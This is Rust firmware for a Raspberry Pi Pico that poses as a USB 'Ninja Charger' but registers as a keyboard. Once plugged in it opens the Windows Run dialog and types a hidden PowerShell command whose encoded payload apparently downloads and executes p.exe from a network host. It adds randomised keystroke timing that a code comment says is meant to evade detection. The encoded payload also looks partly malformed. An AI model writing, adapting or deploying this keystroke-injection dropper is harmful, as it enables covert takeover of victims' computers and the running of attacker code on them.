#![no_std]
#![no_main]

use cortex_m_rt::entry;
use rp_pico::hal::{clocks::init_clocks_and_plls, pac, sio::Sio, watchdog::Watchdog, usb::UsbBus, Timer};
use rp_pico::XOSC_CRYSTAL_FREQ;
use usb_device::{class_prelude::*, prelude::*};
use usbd_hid::{descriptor::KeyboardReport, hid_class::HIDClass};
use usbd_mass_storage::{BlockDevice, UsbMassStorage};

static mut STORAGE: [u8; 64 * 512] = [0; 64 * 512];

struct RamBlock;
impl BlockDevice for RamBlock {
    const BLOCK_BYTES: u32 = 512;
    const BLOCK_COUNT: u32 = 64;
    fn read(&self, lba: u32, buf: &mut [u8]) {
        let base = (lba * 512) as usize;
        buf.copy_from_slice(&unsafe { &STORAGE }[base..base + 512]);
    }
    fn write(&self, lba: u32, buf: &[u8]) {
        let base = (lba * 512) as usize;
        unsafe { (&mut STORAGE)[base..base + 512].copy_from_slice(buf); }
    }
}

fn sc(c: u8) -> (u8, u8) {
    match c {
        b'a'..=b'z' => (0x04 + (c - b'a'), 0),
        b'A'..=b'Z' => (0x04 + (c - b'A'), 0x02),
        b'0'..=b'9' => ([0x27,0x1E,0x1F,0x20,0x21,0x22,0x23,0x24,0x25,0x26][(c-b'0') as usize], 0),
        b' ' => (0x2C, 0), b'-' => (0x2D, 0), b'.' => (0x37, 0), b'/' => (0x38, 0),
        b'\\' => (0x31, 0), b';' => (0x33, 0), b':' => (0x33, 0x02), b'_' => (0x2D, 0x02),
        b'"' => (0x34, 0x02), b'\n' => (0x28, 0), _ => (0, 0)
    }
}

#[entry]
fn main() -> ! {
    let mut pac = pac::Peripherals::take().unwrap();
    let mut watchdog = Watchdog::new(pac.WATCHDOG);
    let clocks = init_clocks_and_plls(
        XOSC_CRYSTAL_FREQ, pac.XOSC, pac.CLOCKS, pac.PLL_SYS, pac.PLL_USB,
        &mut pac.RESETS, &mut watchdog).ok().unwrap();
    watchdog.start(8_000_000); // adjust desired time for watchdog
    let _sio = Sio::new(pac.SIO);
    let mut timer = Timer::new(pac.TIMER, &mut pac.RESETS);
    let usb_bus = UsbBusAllocator::new(UsbBus::new(
        pac.USBCTRL_REGS, pac.USBCTRL_DPRAM, clocks.usb_clock, true, &mut pac.RESETS));
    let mut hid = HIDClass::new(&usb_bus, KeyboardReport::desc(), 10);
    let mut storage = UsbMassStorage::new(&usb_bus, RamBlock);
    let mut dev = UsbDeviceBuilder::new(&usb_bus, UsbVidPid(0x1209, 0x0001))
        .manufacturer("Acme").product("Ninja Charger").serial_number("NINJA001").build();

    const CMD: &str = "powershell -w hidden -EncodedCommand SQBiAHcAcgAgAC0AVQBzZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgaAB0AHQAcABzADoALwAvADEAOQAyAC4AMQA2ADgALgAwAC4AMQAwADAALwBwAC4AZQB4AGUAOwAgAFsAaQBlAHgAIAAkAGIAXQA=\n";
    let mut sent_gui = false;
    let mut pos = 0;
    let mut rng: u32 = 0xDEADBEEF;

    let mut armed = false;

    loop {
        watchdog.feed(); // prevents reset if everything's ok

        if dev.poll(&mut [&mut hid, &mut storage]) {
            if !armed {
                timer.delay_ms(2000); 
                armed = true;
            } else if !sent_gui {
                hid.push_input(&KeyboardReport{modifier:0x08,leds:0,keycodes:[0x15,0,0,0,0,0]}).ok();
                hid.push_input(&KeyboardReport{modifier:0,leds:0,keycodes:[0;6]}).ok();
                sent_gui = true;
                timer.delay_ms(150);
            } else if pos < CMD.len() {
                // random time delays for avoiding heuristic detection, for mimicking human typing patterns
                rng ^= rng << 13; rng ^= rng >> 17; rng ^= rng << 5;
                if timer.wait_ms(((rng & 0x3F) + 25) as u16).is_ok() {
                    let (kc, md) = sc(CMD.as_bytes()[pos]);
                    hid.push_input(&KeyboardReport{modifier:md,leds:0,keycodes:[kc,0,0,0,0,0]}).ok();
                    hid.push_input(&KeyboardReport{modifier:0,leds:0,keycodes:[0;6]}).ok();
                    pos += 1;
                }
            }
        }
    }
}
